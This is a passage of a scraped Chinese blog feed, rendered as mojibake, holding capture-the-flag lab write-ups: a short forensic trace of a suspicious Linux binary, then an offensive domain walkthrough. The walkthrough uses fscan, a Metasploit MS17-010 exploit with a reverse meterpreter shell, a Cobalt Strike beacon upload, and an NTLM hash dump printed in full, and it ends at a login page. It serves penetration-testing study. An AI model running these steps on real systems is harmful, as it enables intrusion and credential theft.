<br><a data-tooltip-position="top" aria-label="2. å¯ç–‘äºŒè¿›åˆ¶æ–‡ä»¶çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿ" data-href="#2. å¯ç–‘äºŒè¿›åˆ¶æ–‡ä»¶çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿ" href="https://www.c1trus.top/about:blank#2._å¯ç–‘äºŒè¿›åˆ¶æ–‡ä»¶çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿ" class="internal-link" target="_self" rel="noopener nofollow">2. å¯ç–‘äºŒè¿›åˆ¶æ–‡ä»¶çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿ</a>
<br><a data-tooltip-position="top" aria-label="3. äºŒè¿›åˆ¶æ–‡ä»¶åœ¨ç³»ç»Ÿä¸­éšè—äº†å“ªä¸ªæ–‡ä»¶ï¼Ÿ" data-href="#3. äºŒè¿›åˆ¶æ–‡ä»¶åœ¨ç³»ç»Ÿä¸­éšè—äº†å“ªä¸ªæ–‡ä»¶ï¼Ÿ" href="https://www.c1trus.top/about:blank#3._äºŒè¿›åˆ¶æ–‡ä»¶åœ¨ç³»ç»Ÿä¸­éšè—äº†å“ªä¸ªæ–‡ä»¶ï¼Ÿ" class="internal-link" target="_self" rel="noopener nofollow">3. äºŒè¿›åˆ¶æ–‡ä»¶åœ¨ç³»ç»Ÿä¸­éšè—äº†å“ªä¸ªæ–‡ä»¶ï¼Ÿ</a>
<br><a data-tooltip-position="top" aria-label="4. äºŒè¿›åˆ¶æ–‡ä»¶åœ¨ç³»ç»Ÿæ—¥å¿—ä¸­ç•™ä¸‹äº†å“ªäº›å‘½ä»¤çš„ç—•è¿¹ï¼Ÿ" data-href="#4. äºŒè¿›åˆ¶æ–‡ä»¶åœ¨ç³»ç»Ÿæ—¥å¿—ä¸­ç•™ä¸‹äº†å“ªäº›å‘½ä»¤çš„ç—•è¿¹ï¼Ÿ" href="https://www.c1trus.top/about:blank#4._äºŒè¿›åˆ¶æ–‡ä»¶åœ¨ç³»ç»Ÿæ—¥å¿—ä¸­ç•™ä¸‹äº†å“ªäº›å‘½ä»¤çš„ç—•è¿¹ï¼Ÿ" class="internal-link" target="_self" rel="noopener nofollow">4. äºŒè¿›åˆ¶æ–‡ä»¶åœ¨ç³»ç»Ÿæ—¥å¿—ä¸­ç•™ä¸‹äº†å“ªäº›å‘½ä»¤çš„ç—•è¿¹ï¼Ÿ</a>
<br><a data-tooltip-position="top" aria-label="5. åœ¨å“ªä¸ªæ—¥å¿—æ–‡ä»¶ä¸­å‘ç°äº†è¿™äº›ç—•è¿¹ï¼Ÿï¼ˆè·¯å¾„ï¼‰" data-href="#5. åœ¨å“ªä¸ªæ—¥å¿—æ–‡ä»¶ä¸­å‘ç°äº†è¿™äº›ç—•è¿¹ï¼Ÿï¼ˆè·¯å¾„ï¼‰" href="https://www.c1trus.top/about:blank#5._åœ¨å“ªä¸ªæ—¥å¿—æ–‡ä»¶ä¸­å‘ç°äº†è¿™äº›ç—•è¿¹ï¼Ÿï¼ˆè·¯å¾„ï¼‰" class="internal-link" target="_self" rel="noopener nofollow">5. åœ¨å“ªä¸ªæ—¥å¿—æ–‡ä»¶ä¸­å‘ç°äº†è¿™äº›ç—•è¿¹ï¼Ÿï¼ˆè·¯å¾„ï¼‰</a>
<br><a data-tooltip-position="top" aria-label="6. éšè—æ–‡ä»¶ /etc/.shadow_auth çš„æƒé™æ˜¯å¤šå°‘ï¼Ÿï¼ˆæ•°å­—å½¢å¼ï¼‰" data-href="#6. éšè—æ–‡ä»¶ /etc/.shadow_auth çš„æƒé™æ˜¯å¤šå°‘ï¼Ÿï¼ˆæ•°å­—å½¢å¼ï¼‰" href="https://www.c1trus.top/about:blank#6._éšè—æ–‡ä»¶_/etc/.shadow_auth_çš„æƒé™æ˜¯å¤šå°‘ï¼Ÿï¼ˆæ•°å­—å½¢å¼ï¼‰" class="internal-link" target="_self" rel="noopener nofollow">6. éšè—æ–‡ä»¶ /etc/.shadow_auth çš„æƒé™æ˜¯å¤šå°‘ï¼Ÿï¼ˆæ•°å­—å½¢å¼ï¼‰</a><br>
é¶æœºé“¾æ¥ <a rel="noopener nofollow" class="external-link" href="https://thehackerslabs.com/binary-trail/" target="_blank">https://thehackerslabs.com/binary-trail/</a><br>
éš¾åº¦ â­ï¸â­ï¸ï¸
<br><br>ä½¿ç”¨ find å‘½ä»¤æœç´¢éæ ‡å‡†ç›®å½•ä¸­çš„å¯ç–‘äºŒè¿›åˆ¶æ–‡ä»¶ ä¸”ä¿®æ”¹æ—¶é—´å¤§äº2024-12-20<br>root@oscar:~# find / -type f -executable -not -path "/bin/*" -not -path "/usr/*" -not -path "/sbin/*" -newermt 2024-12-20 2&gt;/dev/null
/etc/grub.d/01_password
/etc/grub.d/10_linux
/opt/auth_proxy
<br>
/etc/grub.d/ æ˜¯ GRUB å¼•å¯¼åŠ è½½ç¨‹åºçš„é…ç½®è„šæœ¬ç›®å½• 10_linux é€šå¸¸è´Ÿè´£åŠ è½½ Linux å†…æ ¸ æ‰€ä»¥åŸºæœ¬å¯ä»¥æ’é™¤ä¸Šé¢ä¸¤ä¸ª<br>
/opt ä¸€èˆ¬æ˜¯ç¬¬ä¸‰æ–¹ç¨‹åºçš„å®‰è£…ç›®å½•ï¼Œæ‰€ä»¥è¿™ä¸ªå¯ç–‘ç¨‹åºå°±æ˜¯ auth_proxy
<br><br>åˆ©ç”¨ strings å‘½ä»¤è¿›è¡Œæå– å«æœ‰ / çš„å­—ç¬¦ä¸²ã€‚ä¸€èˆ¬æ–‡ä»¶éƒ½ä¼šä¸è¿™ä¸ªæœ‰å…³<br>root@oscar:~# strings /opt/auth_proxy | grep "/"
/lib64/ld-linux-x86-64.so.2
touch /etc/.shadow_auth

<br>/etc/.shadow_auth<br><br>æŸ¥çœ‹ç³»ç»Ÿæ—¥å¿—å³å¯<br>root@oscar:~# strings /var/log/auth.log.1 | grep "auth_proxy"
Dec 21 10:32:45 server auth_proxy: touch /etc/.shadow_auth
Dec 21 10:32:45 server auth_proxy: Probando creaci
Dec 21 10:32:45 server auth_proxy: touch /etc/.shadow_auth
Dec 21 10:32:45 server auth_proxy: Probando creaci
Dec 21 10:32:45 server auth_proxy: touch /etc/.shadow_auth
Dec 21 10:32:45 server auth_proxy: Probando creaci

<br>touch<br>
ä¸Šé¢æ‰§è¡Œ strings /opt/auth_proxy | grep "/" æ—¶å°±ç»™å‡ºäº†è¿™ä¸ªå‘½ä»¤<br><br>æˆ‘ä»¬åœ¨ /var/log/auth.log.1 é‡Œé¢å‘ç°äº†ç—•è¿¹ï¼Œä½†å› ä¸ºæ—¥å¿—æ–‡ä»¶çš„è½®è½¬æœºåˆ¶ï¼Œæ‰€ä»¥å…¶å®æ˜¯æ—¥å¿—æ–‡ä»¶ /var/log/auth.log è¿™é‡Œé¢çš„å†…å®¹<br><br>root@oscar:~# stat -c "%a" /etc/.shadow_auth
600

<br>600]]></description><link>https://www.c1trus.top/24-æ¸—é€/thl/9.binary-trail.html</link><guid isPermaLink="false">24-æ¸—é€/THL/9.Binary Trail.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:47 GMT</pubDate></item><item><title><![CDATA[8.Milanesa]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. ms17-010" data-href="#3. ms17-010" href="https://www.c1trus.top/about:blank#3._ms17-010" class="internal-link" target="_self" rel="noopener nofollow">3. ms17-010</a>
<br><a data-tooltip-position="top" aria-label="4. PTH" data-href="#4. PTH" href="https://www.c1trus.top/about:blank#4._PTH" class="internal-link" target="_self" rel="noopener nofollow">4. PTH</a>

<br><a data-tooltip-position="top" aria-label="4.1. mimikatzæŠ“å–åŸŸæ§hash" data-href="#4.1. mimikatzæŠ“å–åŸŸæ§hash" href="https://www.c1trus.top/about:blank#4.1._mimikatzæŠ“å–åŸŸæ§hash" class="internal-link" target="_self" rel="noopener nofollow">4.1. mimikatzæŠ“å–åŸŸæ§hash</a>


<br><a data-tooltip-position="top" aria-label="5. ç½‘ç«™åˆ©ç”¨" data-href="#5. ç½‘ç«™åˆ©ç”¨" href="https://www.c1trus.top/about:blank#5._ç½‘ç«™åˆ©ç”¨" class="internal-link" target="_self" rel="noopener nofollow">5. ç½‘ç«™åˆ©ç”¨</a><br>
- <a data-tooltip-position="top" aria-label="5.1. ç›®å½•æ‰«æ" data-href="#5.1. ç›®å½•æ‰«æ" href="https://www.c1trus.top/about:blank#5.1._ç›®å½•æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">5.1. ç›®å½•æ‰«æ</a><br>
- <a data-tooltip-position="top" aria-label="5.2. ç™»å½•æ¡†åˆ©ç”¨" data-href="#5.2. ç™»å½•æ¡†åˆ©ç”¨" href="https://www.c1trus.top/about:blank#5.2._ç™»å½•æ¡†åˆ©ç”¨" class="internal-link" target="_self" rel="noopener nofollow">5.2. ç™»å½•æ¡†åˆ©ç”¨</a><br>
é¶æœºé“¾æ¥<br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸ï¸
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# fscan -h 20.20.20.0/24

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _`' |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 2.0.0
[*] æ‰«æç±»å‹: all, ç›®æ ‡ç«¯å£: 21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017,80,81,82,83,84,85,86,87,88,89,90,91,92,98,99,443,800,801,808,880,888,889,1000,1010,1080,1081,1082,1099,1118,1888,2008,2020,2100,2375,2379,3000,3008,3128,3505,5555,6080,6648,6868,7000,7001,7002,7003,7004,7005,7007,7008,7070,7071,7074,7078,7080,7088,7200,7680,7687,7688,7777,7890,8000,8001,8002,8003,8004,8006,8008,8009,8010,8011,8012,8016,8018,8020,8028,8030,8038,8042,8044,8046,8048,8053,8060,8069,8070,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,8100,8101,8108,8118,8161,8172,8180,8181,8200,8222,8244,8258,8280,8288,8300,8360,8443,8448,8484,8800,8834,8838,8848,8858,8868,8879,8880,8881,8888,8899,8983,8989,9000,9001,9002,9008,9010,9043,9060,9080,9081,9082,9083,9084,9085,9086,9087,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9200,9443,9448,9800,9981,9986,9988,9998,9999,10000,10001,10002,10004,10008,10010,10250,12018,12443,14000,16080,18000,18001,18002,18004,18008,18080,18082,18088,18090,18098,19001,20000,20720,21000,21501,21502,28018,20880
[*] å¼€å§‹ä¿¡æ¯æ‰«æ...
[*] CIDRèŒƒå›´: 20.20.20.0-20.20.20.255
[*] å·²ç”ŸæˆIPèŒƒå›´: 20.20.20.0 - 20.20.20.255
[*] å·²è§£æCIDR 20.20.20.0/24 -&gt; IPèŒƒå›´ 20.20.20.0-20.20.20.255
[*] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256
[+] ç›®æ ‡ 20.20.20.1      å­˜æ´» (ICMP)
[+] ç›®æ ‡ 20.20.20.7      å­˜æ´» (ICMP)
[+] ç›®æ ‡ 20.20.20.4      å­˜æ´» (ICMP)
[+] ç›®æ ‡ 20.20.20.2      å­˜æ´» (ICMP)
[+] ç›®æ ‡ 20.20.20.6      å­˜æ´» (ICMP)
[+] ç›®æ ‡ 20.20.20.3      å­˜æ´» (ICMP)
[+] ç›®æ ‡ 20.20.20.5      å­˜æ´» (ICMP)
[+] ICMPå­˜æ´»ä¸»æœºæ•°é‡: 7
[*] å…±è§£æ 218 ä¸ªæœ‰æ•ˆç«¯å£
[+] ç«¯å£å¼€æ”¾ 20.20.20.7:22
[+] ç«¯å£å¼€æ”¾ 20.20.20.3:80
[+] ç«¯å£å¼€æ”¾ 20.20.20.6:80
[+] ç«¯å£å¼€æ”¾ 20.20.20.6:139
[+] ç«¯å£å¼€æ”¾ 20.20.20.5:139
[+] ç«¯å£å¼€æ”¾ 20.20.20.5:135
[+] ç«¯å£å¼€æ”¾ 20.20.20.4:135
[+] ç«¯å£å¼€æ”¾ 20.20.20.4:139
[+] ç«¯å£å¼€æ”¾ 20.20.20.6:445
[+] ç«¯å£å¼€æ”¾ 20.20.20.3:443
[+] ç«¯å£å¼€æ”¾ 20.20.20.3:139
[+] ç«¯å£å¼€æ”¾ 20.20.20.3:135
[+] ç«¯å£å¼€æ”¾ 20.20.20.1:135
[+] ç«¯å£å¼€æ”¾ 20.20.20.6:135
[+] ç«¯å£å¼€æ”¾ 20.20.20.1:139
[+] ç«¯å£å¼€æ”¾ 20.20.20.4:445
[+] ç«¯å£å¼€æ”¾ 20.20.20.5:445
[+] ç«¯å£å¼€æ”¾ 20.20.20.3:445
[+] ç«¯å£å¼€æ”¾ 20.20.20.1:445
[+] ç«¯å£å¼€æ”¾ 20.20.20.4:88
[+] ç«¯å£å¼€æ”¾ 20.20.20.3:3306
[+] ç«¯å£å¼€æ”¾ 20.20.20.1:7680
[+] ç«¯å£å¼€æ”¾ 20.20.20.1:7890
[+] ç«¯å£å¼€æ”¾ 20.20.20.6:3306
[+] ç«¯å£å¼€æ”¾ 20.20.20.5:8080
[+] å­˜æ´»ç«¯å£æ•°é‡: 25
[*] å¼€å§‹æ¼æ´æ‰«æ...
[!] æ‰«æé”™è¯¯ 20.20.20.1:445 - read tcp 20.20.20.7:34666-&gt;20.20.20.1:445: read: connection reset by peer
[!] æ‰«æé”™è¯¯ 20.20.20.6:445 - read tcp 20.20.20.7:34600-&gt;20.20.20.6:445: read: connection reset by peer
[!] æ‰«æé”™è¯¯ 20.20.20.3:445 - read tcp 20.20.20.7:58318-&gt;20.20.20.3:445: read: connection reset by peer
[*] NetInfo
[*] 20.20.20.1
   [-&gt;] yu
   [-&gt;] 192.168.1.1
   [-&gt;] 192.168.8.1
   [-&gt;] 192.168.56.1
   [-&gt;] 10.16.9.188
   [-&gt;] 10.10.10.1
   [-&gt;] 20.20.20.1
   [-&gt;] 30.30.30.1
   [-&gt;] 2409:8760:1e81:10::2:6dc6
[!] æ‰«æé”™è¯¯ 20.20.20.5:445 - read tcp 20.20.20.7:57976-&gt;20.20.20.5:445: read: connection reset by peer
[*] NetBios 20.20.20.1      WORKGROUP\YU
[*] NetInfo
[*] 20.20.20.5
   [-&gt;] Milanesa1
   [-&gt;] 30.30.30.5
   [-&gt;] 10.10.10.5
   [-&gt;] 20.20.20.5
   [-&gt;] 192.168.56.112
[*] NetBios 20.20.20.3      HACKME\WIN-SEUNA992K57
[*] NetInfo
[*] 20.20.20.3
   [-&gt;] WIN-SEUNA992K57
   [-&gt;] 192.168.56.11
   [-&gt;] 10.10.10.3
   [-&gt;] 20.20.20.3
   [-&gt;] 30.30.30.3
[!] æ‰«æé”™è¯¯ 20.20.20.1:7680 - Get "https://20.20.20.1:7680": EOF
[*] ç½‘ç«™æ ‡é¢˜ http://20.20.20.6         çŠ¶æ€ç :503 é•¿åº¦:326    æ ‡é¢˜:Service Unavailable
[*] NetInfo
[*] 20.20.20.6
   [-&gt;] WIN-11ULVN883E8
   [-&gt;] 192.168.56.12
   [-&gt;] 10.10.10.6
   [-&gt;] 20.20.20.6
   [-&gt;] 30.30.30.6
[*] NetBios 20.20.20.6      WORKGROUP\WIN-11ULVN883E8
[*] NetInfo
[*] 20.20.20.4
   [-&gt;] WIN-M5KV71CEGO8
   [-&gt;] 30.30.30.6
   [-&gt;] 20.20.20.4
   [-&gt;] 30.30.30.4
   [-&gt;] 10.10.10.4
[!] æ‰«æé”™è¯¯ 20.20.20.4:88 - Get "http://20.20.20.4:88": read tcp 20.20.20.7:60944-&gt;20.20.20.4:88: read: connection reset by peer
[*] ç½‘ç«™æ ‡é¢˜ https://20.20.20.3        çŠ¶æ€ç :302 é•¿åº¦:0      æ ‡é¢˜:æ— æ ‡é¢˜ é‡å®šå‘åœ°å€: https://20.20.20.3/dashboard/
[*] NetBios 20.20.20.5      WORKGROUP\MILANESA1
[*] ç½‘ç«™æ ‡é¢˜ http://20.20.20.3         çŠ¶æ€ç :302 é•¿åº¦:0      æ ‡é¢˜:æ— æ ‡é¢˜ é‡å®šå‘åœ°å€: http://20.20.20.3/dashboard/
[*] ç½‘ç«™æ ‡é¢˜ http://20.20.20.5:8080    çŠ¶æ€ç :200 é•¿åº¦:4755   æ ‡é¢˜:Milanesas Argentinas
[+] MS17-010 20.20.20.4 (Windows Server 2016 Standard 14393)
[*] NetBios 20.20.20.4      [+] DC:WIN-M5KV71CEGO8.hackme.thl      Windows Server 2016 Standard 14393
[*] ç½‘ç«™æ ‡é¢˜ http://20.20.20.1:7890    çŠ¶æ€ç :400 é•¿åº¦:0      æ ‡é¢˜:æ— æ ‡é¢˜
[*] ç½‘ç«™æ ‡é¢˜ http://20.20.20.3/dashboard/ çŠ¶æ€ç :200 é•¿åº¦:5187   æ ‡é¢˜:Welcome to XAMPP
[!] æ‰«æé”™è¯¯ 20.20.20.1:7890 - Get "https://20.20.20.1:7890": EOF
[*] ç½‘ç«™æ ‡é¢˜ https://20.20.20.3/dashboard/ çŠ¶æ€ç :200 é•¿åº¦:5187   æ ‡é¢˜:Welcome to XAMPP
[!] æ‰«æé”™è¯¯ 20.20.20.3:3306 - Error 1045 (28000): Access denied for user 'mysql'@'20.20.20.7' (using password: YES)
[!] æ‰«æé”™è¯¯ 20.20.20.6:3306 - Error 1045 (28000): Access denied for user 'mysql'@'20.20.20.7' (using password: YES)
[!] æ‰«æé”™è¯¯ 20.20.20.7:22 - æ‰«ææ€»æ—¶é—´è¶…æ—¶: context deadline exceeded
[+] æ‰«æå·²å®Œæˆ: 25/25
[*] æ‰«æç»“æŸ,è€—æ—¶: 12.122585738s


<br>æ•´ç†ä¸€ä¸‹<br>20.20.20.3  HACKME\WIN-SEUNA992K57  å¼€æ”¾ç«¯å£ 80 135 139 443 445 3306
20.20.20.4  WIN-M5KV71CEGO8 å¼€æ”¾ç«¯å£ 53 88 135 139 389 445 464 593 636 3268 3269 
20.20.20.5  Milanesa1 å¼€æ”¾ç«¯å£ 135 139 445 3389 8080
20.20.20.6  WIN-11ULVN883E8 å¼€æ”¾ç«¯å£ 80 135 139 445 3306
 
 åŸŸå hackme.thl
 DC  20.20.20.4  WIN-M5KV71CEGO8.hackme.thl
<br><br>fscanæ‰«æå‡ºåŸŸæ§ä¸»æœº å­˜åœ¨ms17-010<br>
å…ˆé…ç½®hosts<br>msfconsole
msf6 &gt; use exploit/windows/smb/ms17_010_psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting              Required  Description
   ----                  ---------------              --------  -----------
   DBGTRACE              false                        yes       Show extra debug trace info
   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction
   NAMEDPIPE                                          no        A named pipe that can be connected to (leave b
                                                                lank for auto)
   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check
                         work/data/wordlists/named_p
                         ipes.txt
   RHOSTS                                             yes       The target host(s), see https://docs.metasploi
                                                                t.com/docs/using-metasploit/basics/using-metas
                                                                ploit.html
   RPORT                 445                          yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                no        Service description to be used on target for p
                                                                retty listing
   SERVICE_DISPLAY_NAME                               no        The service display name
   SERVICE_NAME                                       no        The service name
   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share
                                                                 (ADMIN$,C$,...) or a normal read/write folder
                                                                 share
   SMBDomain             .                            no        The Windows domain to use for authentication
   SMBPass                                            no        The password for the specified username
   SMBUser                                            no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.8.96     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_psexec) &gt; set lhost 20.20.20.7
lhost =&gt; 20.20.20.7
msf6 exploit(windows/smb/ms17_010_psexec) &gt; set rhosts 20.20.20.4
rhosts =&gt; 20.20.20.4
msf6 exploit(windows/smb/ms17_010_psexec) &gt; run

[*] Started reverse TCP handler on 20.20.20.7:4444
[*] 20.20.20.4:445 - Target OS: Windows Server 2016 Standard 14393
[*] 20.20.20.4:445 - Built a write-what-where primitive...
[+] 20.20.20.4:445 - Overwrite complete... SYSTEM session obtained!
[*] 20.20.20.4:445 - Selecting PowerShell target
[*] 20.20.20.4:445 - Executing the payload...
[+] 20.20.20.4:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176198 bytes) to 20.20.20.4
[*] Meterpreter session 1 opened (20.20.20.7:4444 -&gt; 20.20.20.4:49705) at 2024-12-21 00:44:46 -0500

meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter &gt; shell
Process 1592 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
whoami
nt authority\system


c:\Users\Administrator\Documents&gt;type root_flag.txt
type root_flag.txt
{5de4808fa7cec46234dbccc6c46fa6c84}

<br>æ‹¿ä¸‹ï¼Œè¿™é‡Œæˆ‘ä»¬ä¼ ä¸€ä¸ªcsçš„åé¢å¹¶è¿è¡Œã€‚æ–¹ä¾¿åç»­åˆ©ç”¨<br>meterpreter &gt; upload 3333.exe
[*] Uploading  : /root/Desktop/thl/Milanesa/3333.exe -&gt; 3333.exe
[*] Uploaded 289.00 KiB of 289.00 KiB (100.0%): /root/Desktop/thl/Milanesa/3333.exe -&gt; 3333.exe
[*] Completed  : /root/Desktop/thl/Milanesa/3333.exe -&gt; 3333.exe
meterpreter &gt; shell
Process 1596 created.
Channel 2 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
C:\Windows\system32&gt;3333.exe
3333.exe

<br><img alt="assets/Pasted image 20241221135649.png" src="https://www.c1trus.top/24-æ¸—é€/thl/assets/pasted-image-20241221135649.png"><br><br>åˆ©ç”¨CSæ¨¡å—æŸ¥çœ‹ä¸€ä¸‹åŸŸå†…çš„ä¸»æœº<br>[12/21 14:01:39] [+] =========== æŸ¥è¯¢åŸŸä¸»æœº ==========
[12/21 14:01:39] [*] Tasked beacon to run: dsquery computer
[12/21 14:01:39] [+] host called home, sent: 47 bytes
[12/21 14:01:39] [+] received output:
"CN=WIN-M5KV71CEGO8,OU=Domain Controllers,DC=hackme,DC=thl"
"CN=WIN-SEUNA992K57,OU=Application,OU=Tier 1 Servers,DC=hackme,DC=thl"

<br>å¯ä»¥å‘ç°é™¤äº†DC WIN-M5KV71CEGO8 å¤– è¿˜æœ‰ä¸€å°ä¸»æœº WIN-SEUNA992K57 ä¹Ÿåœ¨åŸŸå†…<br>
WIN-SEUNA992K57å¯¹åº”çš„ipæ˜¯ 20.20.20.3 <br>å°è¯•ä½¿ç”¨åŸŸæ§çš„hashç›´æ¥è¿æ¥ è¿™å°ä¸»æœº<br><br>[12/21 14:05:00] beacon&gt; hashdump
[12/21 14:05:00] [*] Tasked beacon to dump hashes
[12/21 14:05:00] [+] host called home, sent: 82541 bytes
[12/21 14:05:01] [+] received password hashes:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6fda56fabbfce076170e240be62db1bc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8e6213105200de353a368062c3af0f94:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
adm_tier1:1128:aad3b435b51404eeaad3b435b51404ee:064dca142a74133d10a594683e6e9470:::
jenkins:1131:aad3b435b51404eeaad3b435b51404ee:cb8a428385459087a76793010d60f5dc:::
tier0_adm:1135:aad3b435b51404eeaad3b435b51404ee:b6641f2580ced2aa557daa2d1ef0aa23:::
WIN-M5KV71CEGO8$:1000:aad3b435b51404eeaad3b435b51404ee:54bebe11da7a6447eab05ed3dea7a453:::
WIN-SEUNA992K57$:1136:aad3b435b51404eeaad3b435b51404ee:5142662655fe8cce534e074112e50e1d::
<br>ç„¶åå°è¯•ä½¿ç”¨åŸŸæ§çš„HASH ç›´æ¥pth ä½†æ˜¯å‘ç°ä¸è¡Œ<br><br>å…ˆçœ‹ä¸‹ç°åœ¨çš„ä¿¡æ¯<br>20.20.20.3  HACKME\WIN-SEUNA992K57  å¼€æ”¾ç«¯å£ 80 135 139 443 445 3306
20.20.20.4 ã€å·²æ‹¿ä¸‹ã€‘ WIN-M5KV71CEGO8 å¼€æ”¾ç«¯å£ 53 88 135 139 389 445 464 593 636 3268 3269 
20.20.20.5  Milanesa1 å¼€æ”¾ç«¯å£ 135 139 445 3389 8080
20.20.20.6  WIN-11ULVN883E8 å¼€æ”¾ç«¯å£ 80 135 139 445 3306
 
 åŸŸå hackme.thl
 DC  20.20.20.4  WIN-M5KV71CEGO8.hackme.thl
<br>æˆ‘ä»¬å‘ç°å¦å¤–3ä¸ªä¸»æœºéƒ½å¼€æ”¾äº†ç½‘é¡µæœåŠ¡ã€‚<br>
å¯¹è¿™å‡ ä¸ªéƒ½è¿›è¡Œä¸€ä¸‹ç›®å½•æ‰«æ<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/thl/Milanesa]
â””â”€# dirsearch -u http://20.20.20.3
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/thl/Milanesa/reports/http_20.20.20.3/_24-12-21_01-55-52.txt

Target: http://20.20.20.3/

[01:55:52] Starting:

[01:56:01] 301 -  336B  - /dashboard  -&gt;  http://20.20.20.3/dashboard/
[01:56:01] 200 -    5KB - /dashboard/
[01:56:01] 200 -   31KB - /dashboard/faq.html
[01:56:01] 200 -   80KB - /dashboard/phpinfo.php
[01:56:01] 200 -    6KB - /dashboard/howto.html
[01:56:01] 302 -    0B  - /dvwa/  -&gt;  login.php
[01:56:02] 200 -   30KB - /favicon.ico
[01:56:13] 200 -  776B  - /Webalizer/
[01:56:14] 200 -  768B  - /xampp/


â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/thl/Milanesa]
â””â”€# dirsearch -u http://20.20.20.5:8080
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/thl/Milanesa/reports/http_20.20.20.5_8080/_24-12-21_01-56-22.txt

Target: http://20.20.20.5:8080/

[01:56:22] Starting:

[01:56:36] 200 -    1KB - /login.aspx


â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/thl/Milanesa]
â””â”€# dirsearch -u http://20.20.20.6
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/thl/Milanesa/reports/http_20.20.20.6/_24-12-21_01-57-34.txt

Target: http://20.20.20.6/

[01:57:34] Starting:

Task Completed


<br><br>å‘ç° 20.20.20.5:8080 å­˜åœ¨ä¸€ä¸ª /login.aspx<br>
éšä¾¿è¾“å…¥è´¦å·å¯†ç å‘ç°éƒ½å¯ä»¥ç™»å½•ï¼Œè€Œä¸”ç™»å½•åéƒ½æ˜¯ä¸€ä¸ªæŠ¥é”™ç•Œé¢<br>
<img alt="assets/Pasted image 20241221150209.png" src="https://www.c1trus.top/24-æ¸—é€/thl/assets/pasted-image-20241221150209.png"><br>
è¿™å¯èƒ½å°±ä¸æ˜¯ä¸€ä¸ªçœŸçš„ç™»å½•æ¡†<br>
